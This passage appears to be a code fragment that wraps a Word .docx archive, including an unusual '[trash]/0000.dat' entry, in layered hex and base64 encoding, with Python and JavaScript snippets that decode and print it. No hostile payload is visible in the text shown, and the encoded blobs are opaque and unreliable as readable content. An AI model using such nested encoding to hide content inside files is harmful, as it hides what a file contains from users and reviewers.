464A48792F496D646646446C526A71476135756235505974634A794B4671333533706253644A4C3961304677576A636D48583839366142376578724355743238434C73705A6272743455633475796C6D3639542B2F636E5A532F766E2F693168577436436B695A4258787A683533416D326E756B6D684E4968583142384935596E6F7869712B5867416A51496E76366A67394976437A4964486C576E5348706C3363714270684B514349324C384D384C396F59396D63424155353165304D343258647161784D574D786E41396C6336704F66554E4A444D45706378377373624671725662465678526C5837564C6A6F686E456855376C59686C7535434163797058477078473269306146586635615163474A742B6D386E795A6B425061336F57675A6E34627758724B5942504252745A394B6F4C53492B664D7346584973436C4D716A6B6F594167526D4D34303748634E32433233546473434B4942683953474B78327275515249456C4F2B586753506A3544794453486C36475554774353495A5144594475544344665677696B633169466B51744D597754505341636F434C3846454755493668462B5461435147444A49434D592B32694D6B7A466D41724C357845422F317A68715A5547694D6442586F7644686B6D4D32436F316A6F356E31432B5A624B4A34786B45516D58456C774E4E54544851324E6F3762703147304953772F4E32755945506B7642597A43442B497A46575166524B58796739726849664A41527A3577655A31484D65796A323156524A665371596B6735684A6941635277596C51647355666B6F384B5A756C70796773475667356B6E3231426D6E7441366266677254353464455869537358536E6779775237586730747245624F6C586D5839412F436D4E776E4F524664657A3468454F32774F55545830783066475070314864784345754E326F43756550535178487436716169544742473473305757667876314C517865714742614666424D6851566532497A6E7930724C705A7870577461716C724E7849704C396C54344A6A55626271583936646975364B336E4832526E6B61447672466F5A66734F565258424D586F324650754F6C57774959306C3350636F6A656D6F35313032555672757971646A494D366C56676C793666394B79646D737461363973305462557A72574276764D65532B4F6632642F4958777876786338776B71777969724B56394B757173386F2F633142533245376766357253715446774D674F795661346850565132464D364E444B44784C467373674B3875484769614A416346475A4879546C532F4357583744794446396544475A30374633536767567073677354324572364F776E78374B6A585761744E5A6270656A794F4141675978365274766D6F596E6373743261377055725437706573756C55704E65314F766453783758713162316372765737744D6151653767645657393045442B427A4C31307337344E6C2B397164634A42383862376B7361444D354A31765759355033676C58613576756845666930746330434F544A52303574304B7133756B36705665384D536C617632797931584B6462366A6C756F7A666F7558617A4E586873476F6453324F7255586376704E30744F3158564C6C6C4D52394A757455734F71315470576F39507357783078426D43774D676A7055334247386A39786E3652363554395153774D4546414147414167416F6F4E30574330513363646E4177414172676741414245414141423362334A6B4C334E6C64485270626D647A4C6E6874624A3157323237624F4242395832442F7764427A665575546F424469464768634E2B6B6D33514471747338554E624B4A3843494D4B577664722B2B514643306269644F695436466D7A70793538484363712F662F4B7A6E61416C706839434B625432625A434451336C64447252666266313958345866622B2B752B2F72727263676E4E6B74534F4B30445933693678466E56752B4163587357416D4F787072616A626C5275616C727761482F6B2F5552754D67327A6A5835644E6F48545577446D74687167346F354F7A47346E736249706547744175326D5A37505A355252424D6B66313259316F62474A54663870477154614A5A5074614531736C453636627A3135443975313242717439784F2B5535774D614E42797370636B7147647456544F6845592B5876384D5235336F73534765344F534B3770326E34596F305A643367427947696864385779575856394E6F384D444C4E764349384A575150636F754773526776736C4D3947674D5858686D41506974413149475954434A54437175637658794A5269644E505245706947474A2B7567707131306E316C5A65464D51794662526A322B5331556475304F417349316B75317544346F66526A736B6C736F3679666B4A526653546C37684A48333166314B2F7742365464414A2F687079724D3471703779464E6F546176505961707065454F6F2F674A6F71444E322F374F6879766D484975414D734773594A66454F396F5A47706D6370384D65374771415A4A484C474B4578452B65306C436F6A65383945464669326861586430434931756F3454583379384572593669306B38484A54573151696379464770686B6D6B4E4276556A3473484F774E47305A5439394635546152374A65674C6D38747244376573353170695A6545657653644D685A78473947344E464E416567743169464A493458595070674B7678686246732B657A5831515443756E587A54532B3346364C3834742B336F4779547851715363327133432B5252357050504B336F376B624B4B376D6C556D36594B6C477730594E664E4251335944792B784B635051672F6F456D6A395163524633344171326E49416A73654849484A356E46564D7968554A616344524D6F7241766338447659535855496479396D65567977654736384E79776950613233306B6E6F4430396B414F3965654443767969416678454B6D78694A66536F50334D50374A413164376F692F3144762F507938547A703450565A6F64792F55674C4E745753544336504D6F545276764345624B2F33654C4D572F76334E2B42767A45536B4D54432F327242413273615569734A70567A5046356B5536343262653930342B716F59506F5750636E33572B3836436A3736384C337777376E736C64482F776748676B5648385962472B54376531674F302B32383846326B577758672B30793253363962624F6A6655367239346E6B6E593765586873705451665662544975736D636D5035726E512F43444354766E546E505A566B44367167793364396F7665787443586E5037766334466962485971584C5959704F59374D6A6E4D306C685851454E6255426E6B4F6F4F7677467649766A4946784B6E2F7A797566774A5153774D4546414147414167416F6F4E30574472392B702F72414141415A674D41414277414141423362334A6B4C3139795A57787A4C325276593356745A5735304C6E6874624335795A57787A725A4C4C62734D67454558336C666F5061505931647670515651566E4530584B746E552F674F4478513755424D644E482F723749556C7569657547464E306A33416E664F77477833582B4D67506A425137367943497374426F445775376D3272344C553633447A437272792B326A376A6F446D656F6137334A4F496C53776F365A76386B4A5A6B4F5230325A38326A6A5475504371446E4B304571767A5A7475555737792F4547474E41504B693078787242574559313241714D34656C32533770756B4E377031354839487954416C4A794277626F5A697051347573344D664A496D636B6B476C6238304362565948345047434B4D2B6E6C4D4C6472776E7A69366558664179586D637179374E6245615A376E537077482F66753358576F353076795953782F6C4F63435970703757594A3771594B79712F4156424C41775155414159414341436967335259777432507A2B41414141426E4167414143774141414639795A57787A4C7935795A57787A725A444E61674D784449547668623644385433725451716C6C48687A4B595863536B6B66514E6A61585A503442316C4A30376576794B565A5745716750556F6144642F4D656E4F4F423356437169456E7135644E7178556D6C33314967395566753966466B39353039336672647A77416936614F6F56516C54366C6150544B585A324F71477A464362584C424A4A632B557753576B515A54774F3168514C4E7132306444317836366D33697172626561746E367031653672344E2B385455514744777A475A634A464953456A446C6A46484768417474706E39796272656C453051693038356A726B504E377164727A63393848685333624869496C6E476A42345A6B77652F652B41554D727466412F2F7954644E384E50645A795A76704D424C73486D32535A57312B775A5153774D4546414147414167416F6F4E30574976337A4A4278415141413267554141424D41414142625132397564475675644639556558426C6331307565473173745A544C54734D7745455833535078443543314B334C4A41434358706773655356714A38674F4E4D576F4E6A573762372B6E736D53524F685571684D31553255683333757665504A704A4E744C614D315743653079736734475A4549464E656C5549754D764D3966346E737979612B7630766E4F674974777358495A575870764869683166416B3163346B326F50424C7057334E504437614254574D66374946304E7652364935797254776F482F754751664C30435371326B6A353633754C7254726751696B5350336270474B69504D47436B34382B694C726C563549424C7271684963537331584E6149544C57466166414433694B64372F6C456843394B464B65326A4A4C697A64654F57777267627A48744B716C6E7965365A447742515077596F536F686D7A2F70585657414B4B38575A5747306578474D6E66754E4D6C677162614A5A5378515352594C3242493057766E615839333141585846734A7439505672646764726237517471664D37435335632B61424847685A6D352B4163646E63746B343762483255662F5867524F69506750573639684A55394F63444D426F7133692F6E3542672B774E50794F352F62716A364D61794455544B73425268534E6C7A6772356A373439315430444F73434F7834454A744C324F7A2B376E46764E546E4C616A4F76384355457344424251414267414941414141495142307A74497772774541414A454441414151414141415A47396A55484A7663484D76595842774C6E6874624A7854775737624D4179394639672F474C6F33646F4A684B414C61785A426936474846417352747A35704D32384A73535A42596F2B6E586C376151526C6C336D6B2B506A39545449796E44376573345A4250366F4B3070785870566941794E736F303258536B6536782F584E79494C4A45306A423275774645634D347262366367563762783136306867796C6A436846443252322B5A355544324F4D71773462546A54576A394B34744233755731627266444F71706352446557626F766957347975686162433564682B43496970754A2F70663063617132563934716F2B4F4456645157354A447255657343736A504165786C6836466151783442504676664C484545734F756C6C347034507650424A414C75346F4471785773367A716B30684A2F617343717A45664174586E5A65756E34686B776765486E614464677439676E425163734164323639614F5153452F457A41506370354E5875703252464D744A31516B66565A30472B386E4933496673754163394F6C6D4B54583068413350356646594D4744432B5372577450413270794C38514C5473685472722F4F4D754A62425A65464D52672B63754853333342422B746477762F6350734F6A5737654968574533735A38657634354848706D472F375335396E2F5363387574726553634C543643374A5A4A33506D7671446B79727536627A59684963444C7838623375784A37557A4150632F59442F4F56664E5A30324A78715069666775334E5038512B723170745677522F6B43636550372B5070562B38414141442F2F774D41554573424169304143674141414141414141416841502F2F2F2F2B77415141417341454141424141414141414141414141414141414141414141414141467430636D467A614630764D4441774D43356B59585251537745434C5141554141594143414141414345414D4235704777454241414378415141414551414141414141414141414141414141414465415141415A47396A55484A7663484D76593239795A53353462577851537745434C514155414159414341414141434541463655364F4B63414141443041414141464141414141414141414141414141414141416E41774141643239795A4339335A574A545A5852306157356E6379353462577851537745434C5141554141594143414141414345414E416D69644A49414141445141414141456741414141414141414141414141414141414142414141643239795A43396D623235305647466962475575654731735545734241693041464141474141674141414168414A454F37545852417741415077304141424541414141414141414141414141414141417767514141486476636D51765A47396A6457316C626E517565473173554573424169304146414147414167414141416841483243527254794167414146676B4141413841414141414141414141414141414141417767674141486476636D5176633352356247567A4C6E68746246424C415149744142514142674149414141414951446D384D332F4B516341414459664141415641414141414141414141414141414141414F454C4141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577851537745434C5141554141594143414141414345414C524464783263444141437543414141455141414141414141414141414141414141413945774141643239795A43397A5A5852306157356E6379353462577851537745434C5141554141594143414141414345414F7633366E2B73414141426D41774141484141414141414141414141414141414141445446674141643239795A433966636D56736379396B62324E31625756756443353462577775636D56736331424C415149744142514142674149414141414951444333592F5034414141414763434141414C414141414141414141414141414141414150675841414266636D567363793875636D56736331424C415149744142514142674149414141414951434C3938795163514541414E6F4641414154414141414141414141414141414141414141455A414142625132397564475675644639556558426C633130756547317355457342416930414641414741416741414141684148544F306A4376415141416B514D4141424141414141414141414141414141414141416F786F4141475276593142796233427A4C32467763433534625778515377554741414141414177414441442F416741416742774141414141223B0D0A0D0A66756E6374696F6E206261736536344465636F646528737472297B0D0A2020202072657475726E2061746F6228737472293B0D0A7D0D0A0D0A766172206465636F646564537472203D206261736536344465636F646528656E636F646564537472293B0D0A636F6E736F6C652E6C6F67286465636F64656453747229"
decodedStr = bytes.fromhex(hexStr).decode()
print(decodedStr)
```


```text
var encodedStr = "UEsDBAoAAAAAAAAAIQD/////sAEAALABAAAQAAAAW3RyYXNoXS8wMDAwLmRhdP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBLAwQUAAYACAAAACEAMB5pGwEBAACxAQAAEQAZAGRvY1Byb3BzL2NvcmUueG1sIKIVACigAAAAAAAAAAAAAAAAAAAAAAAAAGyQT0vEMBTE74LfoeTepOnqslva7M2TgqCC15C87QabPyRxu/vtTWOtFTwOM+/HvGkPFz0UZ/BBWdMhiitUgBFWKtN36O31odyhIkRuJB+sgQ5dIaADu71phWuE9fDsrQMfFYQikUxohOvQKUbXEBLECTQPOCVMMo/Wax6T9D1xXHzwHkhdVVuiIXLJIycTsHQLEc1IKRak+/RDBkhBYAANJgZCMSW/2Qheh38PsrNKahWvLv00112zpfg2l/QlqCU4jiMeN7lG6k/J+9PjS361VGbaSgBi0z4ezmralW1aspaTN0/O9phWd7imW3xf0/0uB3+8LP6OzL4AAAD//wMAUEsDBBQABgAIAKKDdFgXpTo4pwAAAPQAAAAUAAAAd29yZC93ZWJTZXR0aW5ncy54bWyNjkEKwjAQRfeCdwjZ21QXIqVNQaQXUA9Q02kbaDJhJhrx9AZ0487l5/Pff3X7dIt4ALFF38htUUoB3uBg/dTI66XbHGSr16s6VQluZ4gxFyzyyHNFjZxjDJVSbGZwPRcYwOduRHJ9zJEmheNoDZzQ3B34qHZluVcESx/zIc82sPzS0j+0hDQEQgPMWcQtH57rrZc6O2KI1tkXdEhHwsRAQula/cjrN1BLAwQUAAYACACig3RYNAmidJIAAADQAAAAEgAAAHdvcmQvZm9udFRhYmxlLnhtbI2OTQrCMBCF94J3KLO3qS5ESn824gn0ACGd2EAzE2ai9fgG7AFcPt7je183fuJSvVE0MPVwrBuokBxPgZ49PO63wwXGYb/r1tYzZa3KnLSVHuacU2uMuhmj1ZoTUuk8S7S5RHka9j44vLJ7RaRsTk1zNoKLzeVK55AUNtr6D21lmZKwQ9XiFpcfL9pAMHRm0xu+UEsDBBQABgAIAKKDdFiRDu010QMAAD8NAAARAAAAd29yZC9kb2N1bWVudC54bWy1V81u4zYQvhfoOxi6J5Is23GM2Itt0ixyaBEk27NBU7RFrPgDkrLiPfUVCrTHAr3tA+xbdfsQHf5IsSM3tb3txSI1M99883FI0VdvnljZWxOlqeDTKD1Poh7hWOSUr6bRT+9vz8bRm9m331zVk1zgihFuehDB9WRNplFhjJzEscYFYUifC0k4GJdCMWRgqlYxQ+pDJc+wYBIZuqAlNZu4nySjKMCIaVQpPgkQZ4xiJbRYGhsyEcslxSQ8mgh1SF4feRMou4yxIiVwEFwXVOoGjZ2KBiUWDcj6tSLWrGz8anlItlyhGuRnpaddC5VLJTDRGt7eeOMzYjroYLYinoOIsZcitjAAmCZu9M+AafJaMWFFLFhLoZN/Tx/sFtGUxhDlLYyEhnvRUEcV8k6JSrZovNuer6ElIyfL9lLpr6PzWCBJWjoSfx3aNeJr9Ny0XbQ9mv/r3qtP650tkdLhcWX1OyrT4wBedu8d/9BqnI4wzY+Da1Y9hsgGB7HsQJSwUe2uuoiZyEmZtSh1OtLHtWA6DOLEesPIU9RjeHK34kKhRQlIsFi9WtqfdNhQxU+HlbtFdBDjAilj8f05jp/So0GG8WU87gL1TwCC86ifdqGyo6FGsWXVKe7A03FLIQsErDpIB7b6S6Q9xY1OKi7tdzldnIaUdZHGpyE9t9MMrggLkW/sU7qfe2UfWiIM361ePSkpJw+V7WVUGRGFN9OoP7yMZldx62qjlA9egNMalXAx8R4La8OiFKoxOCgX7V67jB8b42AcgD/699e6a7nWzlbkjQmXBKkQV+TWqG4FNzYUaUzhwPry6Ze/fv+59+fnP778+putgyBt3mqK9piKt1zvC8HwednFcUX4VH5oJQBVpJfCifmaLPq/LRsyh2xmdjfHiJv5Iitpts7mm6Say8rM0XxJy2yechjd39xassZT98SdsAQbV0A6nCyFMFwYci3KivF2Lfzadu02vAnxGvCK3TLTLFROMGWo9EvlTTYERg9EGzjkGkcMy0d5JSrd+gaP4P+47R1aDWDca+siRUtWohX5ThgjmMcCkyt2lyjhuS10H+tS1EQ9CIZ4SwZq+v+Jw/X9e57vkt6hKVePtoNq2Gzppb2g15MCxqNxFnaRdXBqrH5Adv8ZAdfZ9CJJ3VYmSwOzwQD+QNiDwCr0PFd0VWyZC4JyAvf4i2Rsva12W9NVZdw0CWRtOp/3x4q930hiQxjA7TSAXAWrdYVi3ylqt7QBf+u5RFVpHFE4he6pwVBbNnJk7Un/CKcU+IWUIdwtrA4NDM3tjzcYgN39FZr9DVBLAwQUAAYACACig3RYfYJGtPICAAAWCQAADwAAAHdvcmQvc3R5bGVzLnhtbMVWzW7UMBC+I/EOUe5tdpdSQdS0qrZUVIKyglacvY53Y/BPsL1N2xOvgARHJG48AG9FeQhmbKeb/QG2EoJTMv7mf75xsndwKUVywYzlWhVpf7uXJkxRXXI1LdLzs+OtR+nB/v17e01u3ZVgNgF9ZXNJi7Ryrs6zzNKKSWK3dc0UgBNtJHEgmmkmiXk7q7eoljVxfMwFd1fZoNfbTaMbs4kXPZlwyo40nUmmnLfPDBPgUStb8dq23ppNvDXalLXRlFkLNUoR/EnC1a2b/s6KI8mp0VZP3DYUk4WMMnQF5v2ef5Mi3Yc2lZoesQmZCWdRrEcmilHCxxuaNPkFEUU61q4CswzPELE1oZAWwGTiGLSnv9sLeERQyYyMN2mfEMPLi7EA7UT2uk1OtdCmDU5mTgfn/tjHv27BQRv3OpwP7Soy9CXaqmwhKhgxMd+qXEiymw6Uu9QmTy7wUobWQd0pSP70pCzS0Qsvu6uaFWlNDJkaUmPjmlwRydrwp8g9HAMEwHOPs0vX4ugmgHCI4Ltjz1Z/dvve5DM+MlwbYGtruRUN5wia+8ZvNk7BFXs5E5C+7zr4xZMiHTx8HPsVJo9u27nGmTW81M1QK2e0aPOJw+lCaIm+X4EjdvRkSbODLCqe/lLx1Lcl1hhzsX+XH1DrMRSG1CKWcl6kN18//Pj8Pvn+7cvNx0/IAUasO7ScrIGqQ2XXmVC7rOwrCaHCa9wYTzDsxx/5N8BcAv9oBQSksJ0r/Iv7loxahiZY3b/jo2WSP+VlyZSvsisCqVXFS/a6YurcsrCby0eRev/zmth8Ig/mE3FkLNjKNMJtkJxFsHMnzLe4Jf/6/XZjgUSBwY/FkAnxnHgJLm2n5S0fykuCqcDXJ25lwNFOsAlePoE3c71+71EgBeKoZ/i0+q2iV/CZ6HqNwxjY6doPfjFdkE4UXtHLabRWHm8N77wZO/M5qJkcMwPfrzWzSJ5xe5dV2HRGXZLDiLviRpxHG/yzCRvj/3H2fwJQSwMEFAAGAAgAooN0WObwzf8pBwAANh8AABUAAAB3b3JkL3RoZW1lL3RoZW1lMS54bWztWU9v2zYUvw/YdxB0d/1Pku2gbmHLdrO1aYva7dAjI9MWG0o0JDqpURQY2uOAAcO6YZcBu+0wbCvQArt0nyZbh60D+hX2SFoS5T9K2mSHAkmARCLf770fHx/fI8XLVx8G1DjEUUxY2DarlyqmgUOPjUk4bZt3R4NS0zRijsIxoizEbXOBY9O4euXjj4zLaIf7OMAGaAjjHdQ2fc5nO+Vy7EEzii+xGQ6hb8KiAHF4jablcYSOQHNAy7VKxSkHiISmEaIAFN+aTIiHDanSvJIo71OwEPJYNHg0GgrVOIeQsuODqpCIF7FLI+MQ0bYJdsbsaIQfctOgKObQ0TYr8gcg5URYPi7hlG/RomkYyJ81DUvo+KAmeUTT/ZSIZdmW01kiVMfSqJSlfB3Sb/SdvrMOWcoizwOfKK66Jbvb6vbsdZgmrx43WOw1evXqNqiUV9D62vg6tvjdBpXyCmqtQQcDFyZkG1TKK6i9BrWsRs21tkGlvII6a9BGpdOzGtugUt6nJDxYA1Zsp+5ucFIqPWF0dyOyZVuDRm3dZAaAgEzjWxiesJBvi/YAPWDRAASEIEWchAZfzPAEebCO3vz41b/ff2788+KHN8++MY0ZClkMzZVaZVCpw1/xa8mnpfekAqEJI02N4oqR6PDitQ5PrkhB0oi9iMx42/wUTJma4NtXP7999cJ4++r58ZOXx09+O3769PjJr0qvACajTBXsonCqK8iPRK6ZbTjISZkH/vzliz9+/7rYECSFDPD62+d/vXz++rsv//7pWQGsE6F9HTYiAY6Nm/jIuMMCGHsBQ7wfvR9y5COiIzvhNEYhElYL7PW5n0PdXCCKCuS7OO/5exEkzyLAtfmD3ICGfjTnpMDCdT/IAfYYo10WFXrtuuCgTdNoHk6LSUVzXf4OQodFnFwU5uKmP59BdSFFJlwf54Zxm6KQoykOMTdEHzvAuMAL9wnJzcse8SIWswk37hOji0ihC0dkPxe1GXiXBDC/iyLiEEc5X+7dM7qMFnmnhw/zCFidiBYMboRpzv3X0JyjoMjECAVUn7AbiPtFgxguIk+X78ccImiKKTP6YxzHRdhbEfhHC6brCBJ1YTjt0UWQR0ScHBTZuIEY0xE9duD6KJgVYYYk9HXMJ/EBLA1k3Ga8CLbH8itWvMN8ovDEMLpHcC6MTp/F7pJpjmoWgKJnHhXExjXMcutmuKAThHMpEwpgrq4FJHy/ImdfFDlRjqGa5ub5PYtcJyKFq353pbSdJL9a0FwWjcmHX896aB7exrCUt28CLspZbrt4Uc4uylm69T+/cnZS/vn/i1hWt6CkiZBXxzh53Am2nukmhNIhX1B8I5Ynoxiq+XgAjQInv6jg9IvCzIdHlWnSHpl3cqBphKQCI2L8M8L9oY9mcBAU51e0M42XdqaxMWMxnA9lc6pOfUNJDMEpcx7ssbFqrVbFVxRlX7VLjohnEhU7lYhlu5CAcypXGpxG2i0aFXf5aQcGJt+m8nyZkBPa3oWgZn4bwXrKYBPBRtZ9KoLSI+fMsFXIsClMqjkoYAgRmM407HcN2C23TdsCKIBh9SGKx2ruQRIElO+XgSPj5DyDSHl6GUTwCSIZQDYDuTCDfVwikc1iFkQtMYwTPSAcoCL8FEGUI6hF+TaCQGDJICMY+2iMkzFmArL5xEB/1zhqZUGiMdBXovDhkmM2Co1jo5n1C+ZbKJ4xkEQmXElwNNTTHQ2No7bp1G0ISw/N2uYEPkvBYzCD+IzFWQfRKXyg9rhIfJARz5weZ1HMeyj21VRJfSqYkg5hJiAcRwYlQdsUfko8KZulpygsGVg5kn21BmntA6bfgrT54dEXiSsXSngywR7Xg0trEbOlXmX9A/CmNwnORFdez4hEO2wOUTX0x0fGPp1HdxCEuN2oCuePSQxHt6qaiTGBG4s0WWfxv1LQxeqGBaFfBMhQVe2Izny0rLpZxpWtaqlrNxIpL9lT4JjUbbqX96diu6K3nH2RnkaDvrFoZfsOVRXBMXo2FPuOlWwIY0l3Pcojemo5102UVruyqdjIM6lVgly6f9Kydmsta69s0TbUzrWBvvMeS+Of2d/IXwxvxc8wkqwyirKV9Kuqs8o/c1BS2E7gf5rSqTFwMgOyVa4hPVQ2FM6NDKDxLFssgK8uHGiaJAcFGZHyTlS/CWX7DyDF9eDGZ07F3SggVpsgsT2Er6Ownx7KjXWatNZbpejyOAAgYx6RtvmoYncst2a7pUrT7pesulUpNe1OvdSx7Xq1b1crvW7tMaQe7gdVW90ED+BzL10s74Nl+9qdcJB88b7ksaDM5J1vWY5P3glXa5vuhEfi0tc0COTJR05t0Kq3uk6pVe8MSlav2yy1XKdb6jluozfouXazNXhsGodS2OrUXcvpN0tO1XVLllMR9JutUsOq1TpWo9PsWx0xBmCwMgjpU3BG8j9xn6R65T9QSwMEFAAGAAgAooN0WC0Q3cdnAwAArggAABEAAAB3b3JkL3NldHRpbmdzLnhtbJ1W227bOBB9X2D/wdBzfUuToBDiFGhcN+km3QDqts8UNbKJ8CIMKWvdr++QFC0bidOiT6Fmzpy58HCcq/f/KznaAlph9CKbT2bZCDQ3ldDrRfbf19X4Xfb++u+/rrrcgnNktSOK0DY3i6xFnVu+AcXsWAmOxprajblRualrwaH/k/URuMg2zjX5dNoHTUwDmthqg4o5OzG4nsbIpeGtAu2mZ7PZ5RRBMkf12Y1obGJTf8pGqTaJZPtaE1slE66bz15D9u12Bqt9xO+U5wMaNByspckqGdtVTOhEY+Xv8MR53osSGe4OSK7p2n4Yo0Zd3gByGihd8WyWXV9No8MDLNvCI8JWQPcouGsRgvslM9GgMXXhmAPitA1IGYTCJTCqucvXyJRidNPREpiGGJ+ugpq10n1lZeFMQyFbRj2+S1Udu0OAsI1ku1uD4ofRjsklso6yfkJRfSTl7hJH31f1K/wB6TdAJ/hpyrM4qp7yFNoTavPYappeEOo/gJoqDN2/7OhyvmHIuAMsGsYJfEO9oZGpmcp8Me7GqAZJHLGKExE+e0lCoje89EFFi2haXd0CI1uo4TX3y8ErY6i0k8HJTW1QicyFGphkmkNBvUj4sHOwNG0ZT99F5TaR7JegLm8trD7es51piZeEevSdMhZxG9G4NFNAegt1iFJI4XYPpgKvxhbFs+ezX1QTCunXzTS+3F6L84t+3oGyTxQqSc2q3C+RR5pPPK3o7kbKK7mlUm6YKlGw0YNfNBQ3YDy+xKcPQg/oEmj9QcRF34Aq2nIAjseHIHJ5nFVMyhUJacDRMorAvc8DvYSXUIdy9meVyweG68NywiPa230knoD09kAO9eeDCvyiAfxEKmxiJfSoP3MP7JA1d7oi/1Dv/Py8Tzp4PVZody/UgLNtWSTC6PMoTRvvCEbK/3eLMW/v3N+BvzESkMTC/2rBA2saUisJpVzPF5kU642be904+qoYPoWPcn3W+86Cj768L3ww7nsldH/wgHgkVH8YbG+T7e1gO0+288F2kWwXg+0y2S69bbOjfU6r94nknY7eXhspTQfVbTIusmcmP5rnQ/CDCTvnTnPZVkD6qgy3d9ovextCXnP7vc4FibHYqXLYYpOY7MjnM0lhXQENbUBnkOoOvwFvIvjIFxKn/zyufwJQSwMEFAAGAAgAooN0WDr9+p/rAAAAZgMAABwAAAB3b3JkL19yZWxzL2RvY3VtZW50LnhtbC5yZWxzrZLLbsMgEEX3lfoPaPY1dvpQVQVnE0XKtnU/gODxQ7UBMdNH/r7IUluieuGFN0j3AnfOwGx3X+MgPjBQ76yCIstBoDWu7m2r4LU63DzCrry+2j7joDmeoa73JOIlSwo6Zv8kJZkOR02Z82jjTuPCqDnK0EqvzZtuUW7y/EGGNAPKi0xxrBWEY12AqM4el2S7pukN7p15H9HyTAlJyBwboZipQ4us4MfJImckkGlb80CbVYH4PGCKM+nlMLdrwnzi6eXfAyXmcqy7NbEaZ7nSpwH/fu3XWo50vyYSx/lOcCYpp7WYJ7qYKyq/AVBLAwQUAAYACACig3RYwt2Pz+AAAABnAgAACwAAAF9yZWxzLy5yZWxzrZDNagMxDITvhb6D8T3rTQqllHhzKYXcSkkfQNjaXZP4B1lJ07evyKVZWEqgPUoaDd/MenOOB3VCqiEnq5dNqxUml31Ig9Ufu9fFk95093frdzwAi6aOoVQlT6laPTKXZ2OqGzFCbXLBJJc+UwSWkQZTwO1hQLNq20dD1x66m3iqrbeatn6p1e6r4N+8TUQGDwzGZcJFISEjDljFHGhAttpn9ybrelE0Qi085jrkPN7qdrzc98HhS3bHiIlnGjB4Zkwe/e+AUMrtfA//yTdN8NPdZyZvpMBLsHm2SZW1+wZQSwMEFAAGAAgAooN0WIv3zJBxAQAA2gUAABMAAABbQ29udGVudF9UeXBlc10ueG1stZTLTsMwEEX3SPxD5C1K3LJACCXpgseSVqJ8gONMWoNjW7b7+nsmSROhUqhM1U2Uh33uvePJpJNtLaM1WCe0ysg4GZEIFNelUIuMvM9f4nsyya+v0vnOgItwsXIZWXpvHih1fAk1c4k2oPBLpW3NPD7aBTWMf7IF0NvR6I5yrTwoH/uGQfL0CSq2kj563uLrTrgQikSP3bpGKiPMGCk48+iLrlV5IBLrqhIcSs1XNaITLWFafAD3iKd7/lEhC9KFKe2jJLizdeOWwrgbzHtKqlnye6ZDwBQPwYoSohmz/pXVWAKK8WZWG0exGMnfuNMlgqbaJZSxQSRYL2BI0WvnaX931AXXFsJt9PVrdgdrb7QtqfM7CS5c+aBHGhZm5+Acdnctk47bH2Uf/XgROiPgPW69hJU9OcDMBoq3i/n5Bg+wNPyO5/bqj6MayDUTKsBRhSNlzgr5j7491T0DOsCOx4EJtL2Oz+7nFvNTnLajOv8CUEsDBBQABgAIAAAAIQB0ztIwrwEAAJEDAAAQAAAAZG9jUHJvcHMvYXBwLnhtbJxTwW7bMAy9F9g/GLo3doJhKALaxZBi6GHFAsRtz5pM28JsSZBYo+nXl7aQRll3mk+Pj9TTIynD7es4ZBP6oK0pxXpViAyNso02XSke6x/XNyILJE0jB2uwFEcM4rb6cgV7bx160hgyljChFD2R2+Z5UD2OMqw4bTjTWj9K4tB3uW1brfDOqpcRDeWboviW4yuhabC5dh+CIipuJ/pf0caq2V94qo+ODVdQW5JDrUesCsjPAexlh6FaQx4BPFvfLHEEsOull4p4PvPBJALu4oDqxWs6zqk0hJ/asCqzEfAtXnZeun4hkwgeHnaDdgt9gnBQcsAd269aOQSE/EzAPcp5NXup2RFMtJ1QkfVZ0G+8nI3IfsuAc9OlmKTX0hA3P5fFYMGDC+SrWtPA2pyL8QLTshTrr/OMuJbBZeFMRg+cuHS33BB+tdwv/cPsOjW7eIhWE3sZ8ev45HHpmG/7S59n/Sc8utreScLT6C7JZJ3PmvqDkyru6bzYhIcDLx8b3uxJ7UzAPc/YD/OVfNZ02JxqPifgu3NP8Q+r1ptVwR/kCceP7+PpV+8AAAD//wMAUEsBAi0ACgAAAAAAAAAhAP////+wAQAAsAEAABAAAAAAAAAAAAAAAAAAAAAAAFt0cmFzaF0vMDAwMC5kYXRQSwECLQAUAAYACAAAACEAMB5pGwEBAACxAQAAEQAAAAAAAAAAAAAAAADeAQAAZG9jUHJvcHMvY29yZS54bWxQSwECLQAUAAYACAAAACEAF6U6OKcAAAD0AAAAFAAAAAAAAAAAAAAAAAAnAwAAd29yZC93ZWJTZXR0aW5ncy54bWxQSwECLQAUAAYACAAAACEANAmidJIAAADQAAAAEgAAAAAAAAAAAAAAAAAABAAAd29yZC9mb250VGFibGUueG1sUEsBAi0AFAAGAAgAAAAhAJEO7TXRAwAAPw0AABEAAAAAAAAAAAAAAAAAwgQAAHdvcmQvZG9jdW1lbnQueG1sUEsBAi0AFAAGAAgAAAAhAH2CRrTyAgAAFgkAAA8AAAAAAAAAAAAAAAAAwggAAHdvcmQvc3R5bGVzLnhtbFBLAQItABQABgAIAAAAIQDm8M3/KQcAADYfAAAVAAAAAAAAAAAAAAAAAOELAAB3b3JkL3RoZW1lL3RoZW1lMS54bWxQSwECLQAUAAYACAAAACEALRDdx2cDAACuCAAAEQAAAAAAAAAAAAAAAAA9EwAAd29yZC9zZXR0aW5ncy54bWxQSwECLQAUAAYACAAAACEAOv36n+sAAABmAwAAHAAAAAAAAAAAAAAAAADTFgAAd29yZC9fcmVscy9kb2N1bWVudC54bWwucmVsc1BLAQItABQABgAIAAAAIQDC3Y/P4AAAAGcCAAALAAAAAAAAAAAAAAAAAPgXAA